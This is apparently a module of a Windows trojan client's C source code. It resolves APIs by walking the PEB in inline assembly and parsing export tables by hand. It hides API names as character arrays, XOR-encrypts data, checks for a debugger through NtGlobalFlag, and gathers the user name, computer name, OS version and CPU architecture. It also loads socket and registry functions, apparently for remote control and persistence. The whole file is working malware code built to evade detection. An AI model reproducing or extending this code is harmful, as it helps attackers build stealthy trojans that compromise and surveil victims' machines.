
#include <windows.h>
#include <DbgHelp.h>
#include <lm.h>
#include "Public.h"
#include "TrojanClient.h"



ptrLoadLibraryA			lpLoadLibraryA = 0;
ptrGetProcAddress		lpGetProcAddress = 0;
ptrShellExecuteA		lpShellExecuteA = 0;
ptrCreateFileA			lpCreateFileA = 0;
ptrCloseHandle			lpCloseHandle = 0;
ptrReadFile				lpReadFile = 0;
ptrWriteFile			lpWriteFile = 0;
ptrWinExec				lpWinExec	= 0;
ptrSleep				lpSleep = 0;
ptrlstrlenA				lplstrlenA = 0;
ptrlstrcatA				lplstrcatA = 0;
ptrlstrcpyA				lplstrcpyA = 0;
ptrwsprintfA			lpwsprintfA = 0;
ptrWSAStartup			lpWSAStartup = 0;;
ptrsend					lpsend = 0;;
ptrrecv					lprecv = 0;;
ptrclosesocket			lpclosesocket = 0;;
ptrconnect				lpconnect = 0;;
ptrinet_addr			lpinet_addr = 0;;
ptrntohs				lpntohs = 0;;
ptrgethostname			lpgethostname = 0;;
ptrsocket				lpsocket = 0;;
ptrgethostbyname		lpgethostbyname = 0;;
ptrWSACleanup			lpWSACleanup = 0;;

ptrGetUserNameA			lpGetUserNameA = 0;
ptrGetComputerNameA		lpGetComputerNameA = 0;
ptrGetSystemDirectoryA	lpGetSystemDirectoryA = 0;
ptrNetWkstaGetInfo		lpNetWkstaGetInfo = 0;
ptrNetApiBufferFree		lpNetApiBufferFree = 0;
ptrMakeSureDirectoryPathExists lpMakeSureDirectoryPathExists = 0;

ptrRegCreateKeyA		lpRegCreateKeyA		= 0;
ptrRegCloseKey			lpRegCloseKey		= 0;
ptrRegQueryValueExA		lpRegQueryValueExA	= 0;
ptrRegSetValueExA		lpRegSetValueExA	= 0;
ptrRegOpenKeyExA		lpRegOpenKeyExA		= 0;
ptrRegEnumKeyExA		lpRegEnumKeyExA		= 0;
ptrRegDeleteKeyA		lpRegDeleteKeyA		= 0;
ptrRegCreateKeyExA		lpRegCreateKeyExA	= 0;

HMODULE lpDllShell32 = 0;
HMODULE lpDllKernel32 = 0;
HMODULE lpDllUser32 = 0;
HMODULE lpDllWs2_32 = 0;
HMODULE lpDllAdiapi32 = 0;
HMODULE lpDllNetApi32 = 0;
HMODULE lpDllDbghelp = 0;



int CryptData(char * lpdata,int len,unsigned char * key){
	for(int i = 0,j = 0; i < len ;)
	{
		lpdata[i] ^= key[j];
		j ++;
		if (j == CRYPT_KEY_SIZE)
		{
			j = 0; 
		}
		i ++;
	}
	return TRUE;
}



FARPROC MyGetProcAddr(HMODULE hKernel32)
{
#ifndef _WIN64
	FARPROC pGetProcAddr = 0;
	__asm
	{
		pushad
			mov edi,hKernel32

			mov eax,[edi+3ch];pe header

			mov edx,[edi+eax+78h]

		add edx,edi

			mov ecx,[edx+18h];number of functions

			mov ebx,[edx+20h]

		add ebx,edi;AddressOfName

search:

		dec ecx

			mov esi,[ebx+ecx*4]

		add esi,edi;

		mov eax,0x50746547;PteG("GetP")

			cmp [esi],eax

			jne search

			mov eax,0x41636f72;Acor("rocA")

			cmp [esi+4],eax

			jne search

			mov ebx,[edx+24h]

		add ebx,edi;indexaddress

			mov cx,[ebx+ecx*2]

		mov ebx,[edx+1ch]

		add ebx,edi

			mov eax,[ebx+ecx*4]

		add eax,edi

			mov pGetProcAddr,eax
			popad
	}

	return  pGetProcAddr;

#else
	return (FARPROC)GetProcAddress;
#endif
}



HMODULE GetDllKernel32Base()
{
#ifndef _WIN64
	HMODULE hKernel32 = 0;
	__asm
	{
		//assume fs:nothing
		push esi
			xor eax,eax
			mov eax,fs:[eax+30h]    ;指向PEB的指针   
			mov eax,[eax+0ch]		;指向PEB_LDR_DATA的指针   
			mov esi,[eax+0ch]		;根据PEB_LDR_DATA得出InLoadOrderModuleList的Flink字段   
			lodsd
			mov eax, [eax]			;指向下一个节点
			mov eax,[eax+18h]		;Kernel.dll的基地址  
			mov hKernel32,eax
			pop esi
	}

	return hKernel32;
#else
	char szKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
	return GetModuleHandleA(szKernel32);

#endif
}



DWORD GetApi()
{
	lpDllKernel32 = (HMODULE)GetDllKernel32Base();
	if (lpDllKernel32 == FALSE)
	{
		return FALSE;
	}

	lpGetProcAddress = (ptrGetProcAddress)MyGetProcAddr(lpDllKernel32);
	if (lpGetProcAddress == FALSE)
	{
		return FALSE;
	}
	char szLoadLibraryA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
	lpLoadLibraryA = (ptrLoadLibraryA)lpGetProcAddress(lpDllKernel32,szLoadLibraryA);
	if (lpLoadLibraryA == FALSE)
	{
		return FALSE;
	}

	char szWinExec[] = { 'W','i','n','E','x','e','c',0 };
	char szGetSystemTime[]			= {'G','e','t','S','y','s','t','e','m','T','i','m','e',0};
	char szGetTickCount[]			= {'G','e','t','T','i','c','k','C','o','u','n','t',0};
	char szGetSystemDirectoryA[]	= {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A',0};
	char szCreateFileA[]			= {'C','r','e','a','t','e','F','i','l','e','A',0};
	char szCloseHandle[]			= {'C','l','o','s','e','H','a','n','d','l','e',0};
	char szWriteFile[]				= {'W','r','i','t','e','F','i','l','e',0};
	char szReadFile[]				= {'R','e','a','d','F','i','l','e',0};
	CHAR szSleep[]					= {'S','l','e','e','p',0};
	char szGetComputerNameA[]		= {'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0};
	char szlstrlenA[]				= {'l','s','t','r','l','e','n','A',0};
	char szlstrcpyA[]				= {'l','s','t','r','c','p','y','A',0};
	char szlstrcatA[]				= {'l','s','t','r','c','a','t','A',0};
	lpGetComputerNameA = (ptrGetComputerNameA)lpGetProcAddress(lpDllKernel32,szGetComputerNameA);
	lpCreateFileA = (ptrCreateFileA)lpGetProcAddress(lpDllKernel32,szCreateFileA);
	lpCloseHandle = (ptrCloseHandle)lpGetProcAddress(lpDllKernel32,szCloseHandle);
	lpWriteFile = (ptrWriteFile)lpGetProcAddress(lpDllKernel32,szWriteFile);
	lpReadFile = (ptrReadFile)lpGetProcAddress(lpDllKernel32,szReadFile);
	lpSleep = (ptrSleep)lpGetProcAddress(lpDllKernel32,szSleep);
	lpGetSystemDirectoryA = (ptrGetSystemDirectoryA)lpGetProcAddress(lpDllKernel32,szGetSystemDirectoryA);
	lplstrlenA = (ptrlstrlenA)lpGetProcAddress(lpDllKernel32,szlstrlenA);
	lplstrcatA	= (ptrlstrcatA)lpGetProcAddress(lpDllKernel32,szlstrcatA);
	lplstrcpyA	= (ptrlstrcpyA)lpGetProcAddress(lpDllKernel32,szlstrcpyA);
	lpWinExec = (ptrWinExec)lpGetProcAddress(lpDllKernel32, szWinExec);

	char szDllUser32[] = {'u','s','e','r','3','2','.','d','l','l',0};
	char szwsprintfA[] = {'w','s','p','r','i','n','t','f','A',0};
	lpDllUser32 = lpLoadLibraryA(szDllUser32);
	lpwsprintfA = (ptrwsprintfA)lpGetProcAddress(lpDllUser32,szwsprintfA);

	char szDllShell32[]		= {'s','h','e','l','l','3','2','.','d','l','l',0};
	char szShellExecuteA [] = {'S','h','e','l','l','E','x','e','c','u','t','e','A',0};
	lpDllShell32 = lpLoadLibraryA(szDllShell32);
	lpShellExecuteA = (ptrShellExecuteA)lpGetProcAddress(lpDllShell32,szShellExecuteA);

	char szconnect[]				= {'c','o','n','n','e','c','t',0};
	char szWSACleanup[]				= {'W','S','A','C','l','e','a','n','u','p',0};
	char szWSAStartup[]				= {'W','S','A','S','t','a','r','t','u','p',0};
	char szrecv[]					= {'r','e','c','v',0};
	char szsend[]					= {'s','e','n','d',0};
	char szsocket[]					= {'s','o','c','k','e','t',0};
	char szclosesocket[]			= {'c','l','o','s','e','s','o','c','k','e','t',0};
	char szinet_addr[]				= {'i','n','e','t','_','a','d','d','r',0};
	char szntohs[]					= {'n','t','o','h','s',0};
	char szgethostname[]			= {'g','e','t','h','o','s','t','n','a','m','e',0};
	char szgethostbyname[]			= {'g','e','t','h','o','s','t','b','y','n','a','m','e',0};
	char szDllWs2_32[]				= {'w','s','2','_','3','2','.','d','l','l',0};
	lpDllWs2_32 = lpLoadLibraryA(szDllWs2_32);
	lpsend =  (ptrsend)lpGetProcAddress(lpDllWs2_32,szsend);	
	lprecv = (ptrrecv)lpGetProcAddress(lpDllWs2_32,szrecv);
	lpclosesocket = (ptrclosesocket)lpGetProcAddress(lpDllWs2_32,szclosesocket);	
	lpconnect =(ptrconnect)lpGetProcAddress(lpDllWs2_32,szconnect);
	lpinet_addr =  (ptrinet_addr)lpGetProcAddress(lpDllWs2_32,szinet_addr);	
	lpntohs = (ptrntohs)lpGetProcAddress(lpDllWs2_32,szntohs);
	lpgethostname = (ptrgethostname)lpGetProcAddress(lpDllWs2_32,szgethostname);
	lpgethostbyname = (ptrgethostbyname)lpGetProcAddress(lpDllWs2_32,szgethostbyname);
	lpsocket = (ptrsocket)lpGetProcAddress(lpDllWs2_32,szsocket);
	lpWSAStartup =(ptrWSAStartup)lpGetProcAddress(lpDllWs2_32,szWSAStartup);
	lpWSACleanup = (ptrWSACleanup)lpGetProcAddress(lpDllWs2_32,szWSACleanup);
	lpgethostbyname = (ptrgethostbyname)lpGetProcAddress(lpDllWs2_32,szgethostbyname);

	char szDllNetapi32[]		= {'n','e','t','a','p','i','3','2','.','d','l','l',0};
	char szNetWkstaGetInfo[]	= {'N','e','t','W','k','s','t','a','G','e','t','I','n','f','o',0};
	char szNetApiBufferFree[]	= {'N','e','t','A','p','i','B','u','f','f','e','r','F','r','e','e',0};
	lpDllNetApi32 = lpLoadLibraryA(szDllNetapi32);
	lpNetWkstaGetInfo = (ptrNetWkstaGetInfo)lpGetProcAddress(lpDllNetApi32,szNetWkstaGetInfo);
	lpNetApiBufferFree =(ptrNetApiBufferFree) lpGetProcAddress(lpDllNetApi32,szNetApiBufferFree);

	char szAdvapi32[]		= {'A','d','v','a','p','i','3','2','.','d','l','l',0};
	char szGetUserNameA[]	= {'G','e','t','U','s','e','r','N','a','m','e','A',0};
	lpDllAdiapi32 = lpLoadLibraryA(szAdvapi32);
	lpGetUserNameA = (ptrGetUserNameA)lpGetProcAddress(lpDllAdiapi32,szGetUserNameA);

	char szMakeSureDirectoryPathExists[] = {'M','a','k','e','S','u','r','e','D','i','r','e','c','t','o','r','y','P','a','t','h','E','x','i','s','t','s',0};
	char szDllDbghelp[]		= {'d','b','g','h','e','l','p','.','d','l','l',0};
	lpDllDbghelp = lpLoadLibraryA(szDllDbghelp);
	lpMakeSureDirectoryPathExists = (ptrMakeSureDirectoryPathExists)lpGetProcAddress(lpDllDbghelp,szMakeSureDirectoryPathExists);

	char szDlladvapi32[]			= {'a','d','v','a','p','i','3','2','.','d','l','l',0};
	char szRegCreateKeyA[]			= {'R','e','g','C','r','e','a','t','e','K','e','y','A',0};
	char szRegCloseKey[]			= {'R','e','g','C','l','o','s','e','K','e','y',0};
	char szRegQueryValueExA[]		= {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A',0};
	char szRegSetValueExA[]			= {'R','e','g','S','e','t','V','a','l','u','e','E','x','A',0};
	char szRegOpenKeyExA[]			= {'R','e','g','O','p','e','n','K','e','y','E','x','A',0};
	char szRegEnumKeyExA[]			= {'R','e','g','E','n','u','m','K','e','y','E','x','A',0};
	char szRegCreateKeyExA[]		= {'R','e','g','C','r','e','a','t','e','K','e','y','E','x','A',0};
	char szRegDeleteKeyA[]			= {'R','e','g','D','e','l','e','t','e','K','e','y','A',0};
	lpDllAdiapi32 = lpLoadLibraryA(szDlladvapi32);
	lpRegDeleteKeyA =(ptrRegDeleteKeyA)lpGetProcAddress(lpDllAdiapi32,szRegDeleteKeyA);
	lpRegCreateKeyA =(ptrRegCreateKeyA)lpGetProcAddress(lpDllAdiapi32,szRegCreateKeyA);
	lpRegCloseKey =  (ptrRegCloseKey)lpGetProcAddress(lpDllAdiapi32,szRegCloseKey);	
	lpRegQueryValueExA = (ptrRegQueryValueExA)lpGetProcAddress(lpDllAdiapi32,szRegQueryValueExA);
	lpRegSetValueExA = (ptrRegSetValueExA)lpGetProcAddress(lpDllAdiapi32,szRegSetValueExA);	
	lpRegOpenKeyExA = (ptrRegOpenKeyExA)lpGetProcAddress(lpDllAdiapi32,szRegOpenKeyExA);
	lpRegEnumKeyExA = (ptrRegEnumKeyExA)lpGetProcAddress(lpDllAdiapi32,szRegEnumKeyExA);
	lpRegCreateKeyExA = (ptrRegCreateKeyExA)lpGetProcAddress(lpDllAdiapi32,szRegCreateKeyExA);
	return TRUE;
}


int  PebNtGlobalFlagsApproach()
{
#ifndef _WIN64
	int result = 0;
	__asm
	{
		// 进程的PEB
		mov eax, fs:[30h]
		// 控制堆操作函数的工作方式的标志位
		mov eax, [eax + 68h]
		// 操作系统会加上这些标志位FLG_HEAP_ENABLE_TAIL_CHECK, 
		// FLG_HEAP_ENABLE_FREE_CHECK and FLG_HEAP_VALIDATE_PARAMETERS，
		// 它们的并集就是x70
		// 下面的代码相当于C/C++的
		// eax = eax & 0x70
		and eax, 0x70
			mov result, eax
	}

	return result != 0;
#else
	return IsDebuggerPresent();
#endif
}


int GetUserAndComputerName(char * szUsername,char * szComputerName)
{
	DWORD dwSize = MAX_PATH;
	int iRet = lpGetUserNameA(szUsername,&dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	dwSize = MAX_PATH;
	iRet = lpGetComputerNameA(szComputerName,&dwSize);
	if (iRet == 0)
	{
		return FALSE;
	}

	return TRUE;
}



int GetWindowsVersion()
{
	WKSTA_INFO_100 *wkstaInfo = NULL;
	NET_API_STATUS netStatus = lpNetWkstaGetInfo(NULL, 100, (LPBYTE *)&wkstaInfo);
	if (netStatus == NERR_Success) 
	{
		DWORD dwMajVer = wkstaInfo->wki100_ver_major;
		DWORD dwMinVer = wkstaInfo->wki100_ver_minor;
		DWORD dwVersion = (DWORD)MAKELONG(dwMinVer, dwMajVer);
		netStatus = lpNetApiBufferFree(wkstaInfo);

		char strWin9x[]		= {'W','i','n','d','o','w','s',' ','9','.','x',0};
		char strWin2000[]	= {'W','i','n','d','o','w','s',' ','2','0','0','0',0};
		char strWinXP[]		= {'W','i','n','d','o','w','s',' ','X','P',0};
		char strWinVista[]	= {'W','i','n','d','o','w','s',' ','V','i','s','t','a',0};
		char strWin7[]		= {'W','i','n','d','o','w','s',' ','7',0};
		char strWin8[]		= {'W','i','n','d','o','w','s',' ','8',0};
		char strWin10[]		= {'W','i','n','d','o','w','s',' ','1','0',0};
		char strWinUnknow[] = {'U','n','k','n','o','w',0};

		int iSystemVersion = 0;
		if (dwVersion < 0x50000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN9X;
		}
		else if (dwVersion == 0x50000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN2000;
		}
		else if (dwVersion > 0x50000 && dwVersion < 0x60000)
		{
			iSystemVersion = SYSTEM_VERSION_XP;
		}
		else if (dwVersion == 0x60000)
		{
			iSystemVersion = SYSTEM_VERSION_VISTA;
		}
		else if (dwVersion == 0x60001)
		{
			iSystemVersion = SYSTEM_VERSION_WIN7;
		}
		else if (dwVersion >= 0x60002 && dwVersion <= 0x60003)
		{
			iSystemVersion = SYSTEM_VERSION_WIN8;
		}
		else if (dwVersion > 0x60003 || dwVersion >= 0x100000)
		{
			iSystemVersion = SYSTEM_VERSION_WIN10;
		}
		else
		{
			iSystemVersion = SYSTEM_VERSION_UNKNOW;
		}
		return iSystemVersion;
	}

	return FALSE;
}



typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
int GetCpuBits()
{
	BOOL bIsWow64 = FALSE;
	//IsWow64Process is not available on all supported versions of Windows.
	//Use GetModuleHandle to get a handle to the DLL that contains the function and GetProcAddress to get a pointer to the function if available.
	char szKernel32[] = {'k','e','r','n','e','l','3','2',0};
	char szIsWow64Process[] = {'I','s','W','o','w','6','4','P','r','o','c','e','s','s',0};
	LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)lpGetProcAddress(lpDllKernel32,szIsWow64Process);
	if(NULL != fnIsWow64Process)
	{
		int iRet = fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
		if (iRet)
		{
			if (bIsWow64)
			{
				return 64;
			}
		}
	}
	return 32;
}



int WriteLogFile(char * pLog)
{
	HANDLE hFile = CreateFileA(LOG_FILENAME,GENERIC_WRITE,0,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile == INVALID_HANDLE_VALUE){
		return FALSE;
	}

	int iRet = SetFilePointer(hFile,0,0,FILE_END);

	SYSTEMTIME sttime = {0};
	GetLocalTime(&sttime);
	char sztime[1024];
	int sztimelen = wsprintfA(sztime,"%u/%u/%u %u:%u:%u ",sttime.wYear,sttime.wMonth,sttime.wDay,sttime.wHour,sttime.wMinute,sttime.wSecond);
	DWORD dwCnt = 0;
	iRet = WriteFile(hFile,sztime,sztimelen,&dwCnt,0);

	iRet = WriteFile(hFile,pLog,lstrlenA(pLog),&dwCnt,0);
	CloseHandle(hFile);

	if (iRet == FALSE || dwCnt != lstrlenA(pLog)){
		return FALSE;
	}

	return TRUE;
}




